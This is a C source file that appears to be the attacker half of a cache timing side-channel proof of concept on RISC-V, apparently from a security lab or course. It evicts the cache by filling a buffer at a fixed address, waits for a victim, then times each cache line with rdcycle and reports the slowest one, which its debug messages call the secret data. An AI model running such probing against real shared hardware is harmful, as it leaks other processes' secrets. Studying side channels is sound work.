#include "lib.h"
#include "io.h"
#include "str.h"

#define CACHELINE 64
#define PAGE 4096

#if 1
#define dprintf(...) do {} while(0)
#else
#define dprintf(fmt, ...) do { printf(fmt, ##__VA_ARGS__); } while(0)
#endif

#define GARBAGE (256 * 1024)
char *garbagebuf = (char*)0x3fff0000UL;
// _Alignas(4096) char garbagebuf[GARBAGE];

uint64_t __attribute__((optimize("O0"))) measure_access_time(int index) {
	uint64_t start, end;

	// Inline assembly to read the RISC-V cycle counter
	asm volatile("rdcycle %0" : "=r"(start));
	char data = garbagebuf[index * CACHELINE];
	asm volatile("rdcycle %0" : "=r"(end));

	return end - start;
}

int main() {
	busy_loop(25000);
	// usleep(2000000);
	dprintf("[2] attacker: done spinning\n");

	dprintf("garbagebuf address %p\n", garbagebuf);

	// evict all cache
	memset(garbagebuf, 0xcc, GARBAGE);
	memset(garbagebuf, 0xcc, PAGE);
	dprintf("[3] attacker: done filling\n");

	busy_loop(2500000);
	dprintf("[7] attacker: done spinning second time\n");

	dprintf("[8] Measuring access time for accessing secret data...\n");

	// for (int i = 2; i < 4; ++i) {
	// 	uint64_t access_time = measure_access_time(PAGE / CACHELINE + i);

	// 	dprintf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	// }
	// for (int i = 2; i < 4; ++i) {
	// 	uint64_t access_time = measure_access_time(i);

	// 	dprintf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	// }

	uint64_t max_access_time = 0;
	int max_access_time_index = -1;

	for (int i = 0; i < PAGE / CACHELINE; ++i) {
		uint64_t access_time = measure_access_time(i);
		if (access_time > max_access_time) {
			max_access_time = access_time;
			max_access_time_index = i;
		}

		// printf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	}
	printf("[9] Max access time index: %d, cycles: %lu\n",
			max_access_time_index, max_access_time);
}
